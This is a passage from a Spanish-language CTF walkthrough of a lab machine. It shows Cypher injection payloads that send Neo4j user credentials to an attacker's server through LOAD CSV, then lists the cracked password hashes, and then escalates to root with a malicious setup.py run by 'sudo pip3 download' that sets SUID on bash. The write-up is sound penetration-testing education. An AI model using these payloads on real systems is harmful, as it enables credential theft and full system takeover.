                <pre><code class="language-cypher">' match (u:user) with distinct keys(u) as k LOAD CSV FROM 'http://10.10.16.6/?=' + k[0] as _l00 RETURN 1 as _l00//</code></pre>

                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=password HTTP/1.1" 200 -</code></pre>

                <pre><code class="language-cypher">' match (u:user) with distinct keys(u) as k LOAD CSV FROM 'http://10.10.16.6/?=' + k[1] as _l00 RETURN 1 as _l00//</code></pre>

                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=username HTTP/1.1" 200 -</code></pre>

                <p>La etiqueta <code>user</code> tiene dos propiedades: <code>username</code> y <code>password</code>.</p>

                <h3>Extrayendo Credenciales</h3>
                <p>Finalmente, extraigo los datos de credenciales reales concatenando usuario y contrase√±a:</p>

                <pre><code class="language-cypher">' match (u:user) with distinct u.username + ":" + u.password as d LOAD CSV FROM 'http://10.10.16.6/?=' + d as _l00 RETURN 1 as _l00//</code></pre>

                <p>Mi servidor recibe las credenciales:</p>
                <pre><code class="language-plaintext">10.10.11.210 - - "GET /?=admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - "GET /?=john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -</code></pre>

                <p>Las contrase√±as est√°n hasheadas, pero reconozco estos como hashes SHA-256. Usando CrackStation para crackearlos revela:</p>
                <ul>
                    <li><code>admin:admin</code> (ya conocido)</li>
                    <li><code>john:ThisIs4You</code></li>
                </ul>

                <h2>Acceso SSH como John</h2>
                <p>Usando las credenciales recuperadas, me conecto por SSH a la m√°quina como <code>john</code> y recupero la flag de usuario.</p>

                <h2>Escalada de Privilegios - Sudo Pip Download</h2>
                <p>Comprobando los permisos sudo de John revela una configuraci√≥n interesante:</p>
                <pre><code class="language-bash">sudo -l</code></pre>

                <pre><code class="language-plaintext">Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz</code></pre>

                <p>John puede ejecutar <code>pip3 download</code> como root, pero solo para paquetes del servicio local de Gogs en el puerto 3000. Esto est√° dise√±ado como medida de seguridad, pero puedo explotarlo alojando un paquete Python malicioso en un repositorio de Gogs.</p>

                <h3>Accediendo a Gogs</h3>
                <p>Configuro reenv√≠o de puertos local SSH para acceder a Gogs desde mi m√°quina:</p>
                <pre><code class="language-bash">ssh -L 3000:127.0.0.1:3000 john@10.10.11.210</code></pre>

                <p>Accediendo a <code>localhost:3000</code> en mi navegador, inicio sesi√≥n en Gogs usando las credenciales de John (<code>john:ThisIs4You</code>). Noto que ya hay un repositorio de prueba que puedo usar para alojar mi paquete malicioso.</p>

                <h3>Entendiendo el Exploit</h3>
                <p>Descubro esta entrada de blog explicando la vulnerabilidad: <a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">Python Package Manager Install and Download Vulnerability</a></p>

                <p>La clave es que cuando <code>pip download</code> procesa un paquete, lee y ejecuta c√≥digo en <code>setup.py</code> durante la fase de extracci√≥n de metadatos - incluso antes de instalar el paquete. Esto ocurre con privilegios de root cuando se usa <code>sudo</code>.</p>

                <p>Encuentro un repositorio de prueba de concepto demostrando esto: <a href="https://github.com/wunderwuzzi23/this_is_fine_wuzzi">https://github.com/wunderwuzzi23/this_is_fine_wuzzi</a></p>

                <h3>Dise√±ando el Paquete Malicioso</h3>
                <p>Clono el repositorio de prueba de concepto y modifico el <code>setup.py</code> para ejecutar mi payload en lugar de solo imprimir texto. Mi objetivo es establecer el bit SUID en <code>/bin/bash</code>:</p>

                <p><img src="./media/image11.png" alt="Archivo setup.py modificado mostrando el payload malicioso que establece SUID en bash" /></p>

                <p>La modificaci√≥n clave es reemplazar la declaraci√≥n print inofensiva con:</p>
                <pre><code class="language-python">os.system("chmod u+s /bin/bash")</code></pre>

                <p>Construyo el paquete usando el m√≥dulo build de Python:</p>
                <pre><code class="language-bash">python -m build</code></pre>

                <p>Esto crea un archivo <code>.tar.gz</code> en el directorio <code>dist/</code> conteniendo mi paquete malicioso.</p>

                <h3>Subiendo a Gogs</h3>
                <p>Subo el archivo malicioso <code>this_is_fine_wuzzi-0.0.1.tar.gz</code> al repositorio de prueba en Gogs. Crucialmente, configuro el repositorio para que sea p√∫blico para que el paquete pueda descargarse sin autenticaci√≥n.</p>

                <h3>Desencadenando el Exploit</h3>
                <p>Ahora ejecuto el comando sudo para descargar el paquete malicioso:</p>
                <pre><code class="language-bash">sudo pip3 download http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz</code></pre>

                <pre><code class="language-plaintext">Collecting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
  Saved ./this_is_fine_wuzzi-0.0.1.tar.gz
Successfully downloaded this-is-fine-wuzzi</code></pre>

                <p>Durante el proceso de descarga, pip extrae los metadatos del paquete, lo cual desencadena la ejecuci√≥n de mi <code>setup.py</code> malicioso como root. Verifico que el bit SUID se estableci√≥:</p>

                <pre><code class="language-bash">ls -la /bin/bash</code></pre>

                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash</code></pre>

                <p>La <code>s</code> en los permisos confirma que el bit SUID est√° establecido.</p>

                <h2>Acceso Root</h2>
                <p>Con el bit SUID establecido en bash, ahora puedo generar una shell root:</p>
                <pre><code class="language-bash">bash -p</code></pre>

                <p>El flag <code>-p</code> preserva el ID de usuario efectivo, asegurando que se honra el bit SUID. Esto me otorga una shell root:</p>

                <pre><code class="language-bash">whoami</code></pre>

                <pre><code class="language-plaintext">root</code></pre>

                <p>Ahora puedo recuperar la flag de root y completar la m√°quina.</p>
            </div>
        </article>
    </main>
    <script src="../../index.js"></script>
</body>

</html>